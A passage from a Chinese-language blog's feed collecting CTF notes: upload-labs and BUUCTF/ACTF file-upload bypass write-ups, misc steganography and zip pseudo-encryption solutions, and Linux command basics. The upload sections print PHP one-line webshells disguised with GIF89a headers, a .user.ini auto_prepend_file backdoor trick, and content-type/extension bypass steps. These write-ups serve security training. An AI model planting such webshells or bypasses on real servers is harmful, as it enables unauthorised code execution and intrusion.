$ext;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</li><li>image_type_to_extension 根据指定的图像类型返回对应的后缀名</li><li>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）<br>这题只是换了一个检验方式，做法同上一题</li></ul><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。简单来说就是判断一个图像的类型<br>解法同上</p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p><strong>二次渲染绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br><span class="line">    $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;];</span><br><span class="line">    $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename);</span><br><span class="line"></span><br><span class="line">    // 获得上传文件的扩展名</span><br><span class="line">    $fileext= substr(strrchr($filename,&quot;.&quot;),1);</span><br><span class="line"></span><br><span class="line">    //判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是png格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                 //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.png&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是gif格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.gif&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关对上传图片进行了判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif&#x2F;jpg&#x2F;png图片，最后再做了一次二次渲染，但是后端二次渲染需要找到渲染后的图片里面没有发生变化的Hex地方，添加一句话，通过文件包含漏洞执行一句话，使用蚁剑进行连接<br>补充知识：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">二次渲染：后端重写文件内容</span><br><span class="line">imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像</span><br><span class="line">imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像</span><br><span class="line">imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像</span><br></pre></td></tr></table></figure><p>ps:对于做文件上传之二次渲染建议用GIF图片，相对于简单一点<br>pass:上传正常的GIF图片下载回显的图片，用010Editor编辑器进行对比两个GIF图片内容，找到相同的地方（指的是上传前和上传后，两张图片的部分Hex仍然保持不变的位置）并插入PHP一句话，上传带有PHP一句话木马的GIF图片<br><img src="/./img/160.png"><br><img src="/./img/148.png"><br><img src="/./img/149.png"></p><h2 id="极客大挑战-2019-Upload-1"><a href="#极客大挑战-2019-Upload-1" class="headerlink" title="[极客大挑战 2019]Upload 1"></a>[极客大挑战 2019]Upload 1</h2><h3 id="php标记"><a href="#php标记" class="headerlink" title="php标记"></a>php标记</h3><p>1、标准标记<br>标准标记以<?php开始，以?>结束<br>标准标记是PHP最常用的标记类型，具有更好的兼容性、可移植性、可复用性</p><p>2、短标记<br>短标记以“<?”开始，以“?>”结束<br>短标记非常简单，但是使用短标记需要在配置文件php.ini中启用short_open_tag选项，短标记在许多环境的默认设置中是不支持的，因此PHP不推荐使用这种标记</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo “Hello,PHP”;  ?&gt;</span><br></pre></td></tr></table></figure><p>3、ASP标记<br>ASP标记以“&lt;%”开始，以“%&gt;”结束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% echo “Hello,PHP”;  %&gt;</span><br></pre></td></tr></table></figure><p>4、SCRIPT标记<br>SCRIPT标记以“<code>&lt;script language=“php”&gt;</code>”开始，以“<code>&lt;/script&gt;</code>”结束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=“php”&gt; echo “Hello,PHP”;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>SCRIPT标记类似于javascript语言标记，由于PHP一般不推荐使用该标记<br>在上述四种标记中，只有标准标记和SCRIPT标记能够保证对任何配置都有效</p><h3 id="php注释"><a href="#php注释" class="headerlink" title="php注释"></a>php注释</h3><p>1、C++风格注释：以“&#x2F;&#x2F;”开始，到该行结束或PHP标记结束之前的内容都是注释，单行注释<br>2、C风格注释：C风格注释以“<code>/*</code>”开始，以“<code>*/</code>”结束<br>3、Shell风格注释:#输出一段话,单行注释</p><p>#pass:<br><img src="/./img/147.png"><br>先上传一句话木马试试，这里格式直接不变，先上传看看<br><img src="/./img/150.png"><br>提示说不是图片，需要抓包改文件格式。将Content-Type里面的格式改为image&#x2F;jpeg<br>绕过后缀的有文件格式有php,php3,php4,php5,phtml.pht<br><img src="/./img/151.png"><br>前几个php格式的一句话都被b了，比如php3<br><img src="/./img/152.png"><br>将文件格式改到phtml可以了，但带&lt;?的一句话都不行<br>换个一句话木马   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[1])&lt;/script&gt;</span><br><span class="line">//习惯在文件前加上GIF89a来绕过PHP getimagesize的检查</span><br></pre></td></tr></table></figure><p>没加GIF89a如图<br><img src="/./img/153.png"><br>然后上传，抓包改文件格式为image&#x2F;jpeg<br>拿蚁剑连接,flag在根目录里面</p><h3 id="文件头绕过getimagesize"><a href="#文件头绕过getimagesize" class="headerlink" title="文件头绕过getimagesize()"></a>文件头绕过getimagesize()</h3><p>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。<br>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。<br><strong>GIF89a</strong><br>“GIF89a”经常作为“Graphics Interchange Format number 89A”的缩写来使用，中文表示：“图形交换格式编号89A”<br>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。</p><ul><li>绕过原理<br>绕过getimagesize()其实很简单，我们只需要在文件内容的起始位置加上一个GIF89a即可，这样我们的文件就会被认为是一个图片，php的getimagesize()函数也检测不出来我们构造的这个“虚假”的图片是无效的。</li></ul><h2 id="ACTF2020-新生赛-Upload-1"><a href="#ACTF2020-新生赛-Upload-1" class="headerlink" title="[ACTF2020 新生赛]Upload 1"></a>[ACTF2020 新生赛]Upload 1</h2><p>直接尝试上传1.php<br><img src="/./img/154.jpg"><br>是文件限制，打开源代码<br><img src="/./img/155.jpg"><br>return checkFile()删去，继续上传<br>如果是PHP文件，发现也是不能上传的，说明后端也有验证，直到phtml<br><img src="/./img/156.jpg"></p><h3 id="攻防世界-easyupload"><a href="#攻防世界-easyupload" class="headerlink" title="攻防世界-easyupload"></a>攻防世界-easyupload</h3><p>.user.ini文件形成后门原理就是会在执行所有的php文件之前包含.user.ini所指定的文件,前提是含有.user.ini的文件夹下需要有正常的php文件<br>上传.user.ini,image&#x2F;jpeg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a </span><br><span class="line">auto_prepend_file=shell.jpg</span><br></pre></td></tr></table></figure><p>再直接上传shell.jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=eval($_POST[&#x27;cmd&#x27;]);?&gt;  //有点小问题</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?=system(&#x27;cat /flag&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>访问：<code>http://61.147.171.105:65026/uploads/index.php</code><br><img src="/../img/image-20231009232956407.png" alt="image-20231009232956407"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc</title>
      <link href="/misc.html"/>
      <url>/misc.html</url>
      
        <content type="html"><![CDATA[<p><strong>常见文件头</strong></p><table><thead><tr><th>后缀</th><th>文件头</th><th>文件尾</th></tr></thead><tbody><tr><td>PNG</td><td>89 50 4E 47 0D 0A 1A 0A</td><td>AE 42 60 82</td></tr><tr><td>GIF</td><td>47 49 46 38 39 61</td><td>00 3B</td></tr><tr><td>JPEG</td><td>FF D8 FF</td><td>FF D9</td></tr><tr><td>zip</td><td>50 4B 03 04</td><td>50 4B</td></tr><tr><td>rar</td><td>52 61 72 21</td><td></td></tr></tbody></table><p><strong>伪加密</strong></p><p>一个加密的压缩包，由三部分组成：压缩源文件数据区、压缩源文件目录区、压缩源文件目录结束标志<br><img src="/img/100.png"></p><p>1、压缩源文件数据区<br>50 4B 03 04 压缩包的文件头标记 4bytes<br>14 00 解压文件所需的pkware版本 2bytes<br>09 00 全局方式位标记 2bytes (这里可以来判断有无加密，0奇数 00 加密，0偶数 00 无加密)</p><p>2、压缩源文件目录区(从第二个50 4B开始)<br>50 4B 01 02 目录中文件文件头标记 4bytes<br>1F 00 压缩使用的pkware 版本 2bytes<br>14 00 解压文件所需的pkware版本 2bytes<br>09 00 全局方式位标记 2bytes<br>(这里可以来判断有无加密，解决伪加密，0奇数 00 加密，0偶数 00 无加密)</p><p>3、压缩源文件目录结束标志<br>50 4B 05 06 目录结束标记 4bytes</p><p>压缩源文件数据区(50 4B 03 04起)和压缩源文件目录区(50 4B 01 02起)的全局方式位标记均为 0偶数 00，则是未加密<br>压缩源文件数据区(50 4B 03 04起)和压缩源文件目录区(50 4B 01 02起)的全局方式位标记均为 0奇数 00，则是真加密<br>压缩源文件数据区(50 4B 03 04起)的全局方式位标记为 0偶数 00，压缩源文件目录(50 4B 01 02起)的全局方式位标记为 0奇数 00，则是伪加密</p><h2 id="一些思路总结"><a href="#一些思路总结" class="headerlink" title="一些思路总结"></a>一些思路总结</h2><p><strong>图片题</strong><br>1、图片宽高<br>2、图片备注<br>3、010editor查看搜索flag、binwalk能否分离<br>4、隐写术，outguess、、、<br><strong>压缩包</strong><br>1、伪加密<br>2、能否binwalk<br><strong>excel</strong><br>1、在010editor中查找flag<br>2、binwalk<br><strong>gif</strong><br>1、stegsolve分析</p><h3 id="ISCC-奇特的信息"><a href="#ISCC-奇特的信息" class="headerlink" title="ISCC 奇特的信息"></a>ISCC 奇特的信息</h3><p>使用subbreaker破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subbreaker break --lang EN --text &quot;内容&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/71.png"><br>注意：命令行输入粘贴的文本不可随便换行(相当于回车)，可能会当成命令执行</p><h2 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h2><h3 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h3><p>打开压缩包，里面是<br><img src="/img/99.png"><br>这题题目是伪加密，所以我们先来了解一下什么是伪加密</p><p>这题叫伪加密， 所以按伪加密来处理，将09 00 改为00 00（只要改为偶数即可）<br>解压得到flag.txt，直接打开即可<br><a href="https://blog.csdn.net/Hrain7/article/details/127719279">BUUCTF MISC zip伪加密</a></p><h3 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h3><p>先下载了一个wireshark<br><a href="https://blog.csdn.net/wangyuxiang946/article/details/124200238">Wireshark零基础使用教程</a></p><p>被嗅探的流量.pcapng 默认是用Wireshark打开<br><img src="/img/101.png"><br><strong>寻找POST包</strong>：</p><blockquote><p>http.request.method&#x3D;&#x3D;POST</p></blockquote><p><strong>跟踪TCP流</strong>：<br><img src="/img/102.png"><br>得到flag<br><img src="/img/103.png"></p><h3 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h3><p><img src="/img/104.png"></p><h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><ul><li><p>linux系统下file命令用于查询文件类型<br>平时我们判定一个文件的类型通常是通过该文件的扩展名，而file命令是通过详细阅读文件内容，找到特征量来判定文件类型</p></li><li><p>strings命令在对象文件或二进制文件中查找可打印的字符串</p></li><li><p>对图片进行尝试，发现最低位隐写的时候是个zip文件：<br><img src="/img/118.png"><br>save bin保存为zip文件,但是文件被损坏<br>进行修复后打开，是一个名为1的文件<br><img src="/img/119.png"><br>我们可以直接尝试使用Notepad++打开<br>从开头可以看出是一个EIF文件</p></li><li><p>ELF：一种二进制文件格式<br><img src="/img/120.png"><br>可以直接找到flag<br><img src="/img/121.png"><br>也可以使用kali(linux系统就行)<br>执行file .&#x2F;1 和 strings .&#x2F;1<br><img src="/img/122.png"><br><img src="/img/123.png"><br>使用ubuntu18.04直接就.&#x2F;1<br><img src="/img/131.png"><br>不大理解<br>或者直接使用IDA打开<br><img src="/img/124.png"><br>但是目前不会使用IDA</p></li></ul><h3 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h3><p>下载文件，发现该文件里面包含一张图片和一个压缩包<br>双击压缩包无法直接打开<br><img src="/img/125.png"><br>使用zip修复也不行<br>但是发现使用7-zip就可以了<br><img src="/img/126.png"><br>但是需要密码<br>查看那张图片<br>通过16进制编辑器和StegSolve对该图片进行检查，发现并没有突破口<br>这时发现该图片下面有一行不明字符<br><img src="/img/127.png"><br>这段神秘字符为一段盲文，上网对照一下就行<br>经过破译的该段盲文的密码为：kmdonowg<br>将该密码去解压文件中的压缩包，得到一个music.wav音频文件<br>打开该音频文件，发现该文件很像摩斯电码，将该音频文件在Audacity打开<br><img src="/img/129.png"><br>通过该音频可以得到一个摩斯密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.-./-/..-./.--/.--././../-----/---../--.../...--/..---/..--../..---/...--/-../--..</span><br></pre></td></tr></table></figure><ul><li>解码后的值为：CTFWPEI08732?23DZ<br>将CTF转为flag，其他大写变小写后，才能正确提交flag</li><li>转换后的flag为:flag{wpei08732?23dz}</li></ul><h3 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h3><p><img src="/img/130.png"><br>.bin文件<br>使用RouterPassView打开文件<br>flag不是username就是password</p><h3 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h3><p>打开是一个图片<br><img src="/img/132.png"><br>查看了图片hex，发现了pk(zip文件的开头)<br>使用binwalk+foremost<br><img src="/img/133.png"><br>把文件保存到物理机打开<br>发现zip文件中的vmdk需要密码，爆破无效<br>考虑到可能是伪加密，09改成00<br><img src="/img/134.png"><br>vmdk文件可以用7z解压：</p><ul><li>7z x flag.vmdk -o.&#x2F;<br>解压出来的一堆东西里面有：<br><img src="/img/135.png"><br>打开后分别是Brainfuck编码和Ook!编码<br>他们的形式都很显而易见<br>得到的两个部分拼接起来就是flag</li></ul><h3 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h3><ul><li>binwalk+伪加密+steghide对图片中的信息进行提取</li></ul><h3 id="BJDCTF2020-你猜我是个啥"><a href="#BJDCTF2020-你猜我是个啥" class="headerlink" title="[BJDCTF2020]你猜我是个啥"></a>[BJDCTF2020]你猜我是个啥</h3><p>解压附件attachment.zip时提示该文件为非压缩文件，联想题目，应该不是压缩包，010打开，开头发现PNG<br>然后拉到结尾直接发现了flag</p><h3 id="梅花香之苦寒来"><a href="#梅花香之苦寒来" class="headerlink" title="梅花香之苦寒来"></a>梅花香之苦寒来</h3><p>这题打开是张图片，用010editor打开发现寻找png文件尾，发现文件尾后面还有很长的内容<br><img src="/img/184.png"><br>左边是16进制形式的ascii，右边是对应的内容，这些内容看起来依然是ascii码，猜测是16进制转字符串，试一试发现对应的字符串是坐标，直接使用16进制转字符串的脚本，输出文件flag.txt，然后利用坐标绘制二维码脚本完成解题</p><h3 id="谁赢了比赛？"><a href="#谁赢了比赛？" class="headerlink" title="谁赢了比赛？"></a>谁赢了比赛？</h3><p>zip加密，用工具解密后里面是gif文件，用stegsolve打开，使用frame browser查看帧，在310帧看到<br><img src="/img/185.png"><br>save保存图片然后再用stegsolve打开，调整通道，发现一个二维码，扫描即可得到flag</p><h3 id="SWPU2019-我有一只马里奥"><a href="#SWPU2019-我有一只马里奥" class="headerlink" title="[SWPU2019]我有一只马里奥"></a>[SWPU2019]我有一只马里奥</h3><p>虽然是ntfs文件流隐写，但是binwalk已经帮我分离出来了<br><img src="/img/186.png"><br><a href="https://blog.csdn.net/Goodric/article/details/127173751">ntfs文件流隐写</a></p><h3 id="GXYCTF2019-gakki-1"><a href="#GXYCTF2019-gakki-1" class="headerlink" title="[GXYCTF2019]gakki 1"></a>[GXYCTF2019]gakki 1</h3><p>分离出压缩包后破解密码拿到flag.txt，打开<br>是这样无规律的字符，这里用到字符统计<br><img src="/img/187.png"></p><h3 id="SWPU2019-伟大的侦探1"><a href="#SWPU2019-伟大的侦探1" class="headerlink" title="[SWPU2019]伟大的侦探1"></a>[SWPU2019]伟大的侦探1</h3><p>得到一个压缩包，但是要密码，破解失败，看到有一个密码.txt，打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">压缩包密码:摂m墷m卪倕ⅲm仈Z</span><br><span class="line">呜呜呜,我忘记了压缩包密码的编码了,大家帮我解一哈。</span><br></pre></td></tr></table></figure><p>用010editor打开，并设置编辑方式-&gt;ebcdlc，发现密码<code>wllm_is_the_best_team!</code><br>福尔摩斯小人密码<br><img src="/img/188.jpg"></p><h3 id="黑客帝国"><a href="#黑客帝国" class="headerlink" title="黑客帝国"></a>黑客帝国</h3><p>将.txt文件中的16进制转字符串(或者直接用010editor打开)明显发现是rar文件<br><img src="/img/188.png"><br>使用16进制转文件的脚本转成rar文件,破解密码后打开是一张格式不正确的图片，直接用010打开，发现文件头像是png但不是，文件尾是jpeg的，所以直接将文件头改成jpeg就可以成功打开</p><h3 id="HBNIS2018-低个头"><a href="#HBNIS2018-低个头" class="headerlink" title="[HBNIS2018]低个头"></a>[HBNIS2018]低个头</h3><p>键盘隐写，直接看键盘</p><h3 id="MRCTF2020-你能看懂音符吗"><a href="#MRCTF2020-你能看懂音符吗" class="headerlink" title="[MRCTF2020]你能看懂音符吗"></a>[MRCTF2020]你能看懂音符吗</h3><p>word显示隐藏文字<br><img src="/img/189.png"><br><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">音符解密</a></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><a href="http://www.atoolbox.net/Tool.php?Id=703">aaencode编码</a></p><h3 id="buuctf-misc-我吃三明治"><a href="#buuctf-misc-我吃三明治" class="headerlink" title="buuctf misc 我吃三明治"></a>buuctf misc 我吃三明治</h3><p>搜索jpg尾发现后面还有一串，是另一个jpeg文件头，说明这个图片是两张图片拼接而成的，在第一个图片尾和第二个图片头中间有一串base32编码就是flag</p><h3 id="SWPU2019-你有没有好好看网课"><a href="#SWPU2019-你有没有好好看网课" class="headerlink" title="[SWPU2019]你有没有好好看网课?"></a>[SWPU2019]你有没有好好看网课?</h3><p>提示flag3的密码是6位<br><img src="/img/191.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux</title>
      <link href="/linux.html"/>
      <url>/linux.html</url>
      
        <content type="html"><![CDATA[<h2 id="linux路径的描述方式"><a href="#linux路径的描述方式" class="headerlink" title="linux路径的描述方式"></a>linux路径的描述方式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、在linux系统中没有盘符的概念，只有一个根目录/(斜杠)，所有的文件都在它下面</span><br><span class="line">2、在linux系统中层次关系使用/来表示，Windows使用\来表示</span><br><span class="line">比如说/根目录下面的usr文件夹下的local文件夹中的hello.txt表示路径为/usr/local/hello.txt,第一个反斜杠表示根目录，后面的/表示层级关系</span><br><span class="line">3、</span><br></pre></td></tr></table></figure><h2 id="linux命令基础"><a href="#linux命令基础" class="headerlink" title="linux命令基础"></a>linux命令基础</h2><h3 id="什么是命令、命令行"><a href="#什么是命令、命令行" class="headerlink" title="什么是命令、命令行"></a>什么是命令、命令行</h3><p>学习linux，本质上是学习在命令行下熟练的使用linux的各项命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令行：即linux终端，是一种命令提示符页面。以纯字符的形式操作系统，可以使用各种字符化命令对系统发出操作指令。</span><br><span class="line">命令：即linux程序。一个命令就是一个linux的程序。命令没有图形化界面，可以在命令行提供字符化的反馈</span><br></pre></td></tr></table></figure><h3 id="linux命令的通用格式"><a href="#linux命令的通用格式" class="headerlink" title="linux命令的通用格式"></a>linux命令的通用格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">command [-options] [parameter] </span><br><span class="line">commmand:命令本身 -options:[可选，非必填]命令的一些选项，控制命令的一些行为细节</span><br><span class="line">parameter：[可选，非必填]命令的参数，多数用于命令的指向目标等 语法中[]表示可选</span><br><span class="line">实例：ls -l /home/itheima,ls是命令本身，-l是选项,/home/itheima是参数</span><br><span class="line">意思是以列表的形式，显示/home/itheima目录内的内容</span><br></pre></td></tr></table></figure><h2 id="ls命令入门"><a href="#ls命令入门" class="headerlink" title="ls命令入门"></a>ls命令入门</h2><p>ls命令的作用是列出目录下的内容，语法细节如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls [-a -l -h] [linux路径]</span><br><span class="line">当不使用选项和参数，直接使用ls命令本体，表示：以平铺形式，列出当前工作目录下的内容</span><br><span class="line">当前工作目录：linux系统的命令行终端，在启动时默认加载：</span><br><span class="line">1、当前登录用户的HOME目录作为当前工作目录，所以ls命令列出的时HOME目录的内容</span><br><span class="line">HOME目录：每个linux用户在linux操作系统的个人账户目录，路径：/home/用户名</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ls命令的参数和选项"><a href="#ls命令的参数和选项" class="headerlink" title="ls命令的参数和选项"></a>ls命令的参数和选项</h3><p>参数：指定一个linux路径，列出此路径下的内容<br>选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-a:表示all的意思，即列出全部文件(包含隐藏文件/文件夹)</span><br><span class="line">-l:表示以列表的形式展示内容，并展示更多信息</span><br><span class="line">-h:需要和-l选项搭配使用，可以在列表中文件大小一栏显示单位</span><br></pre></td></tr></table></figure><p><img 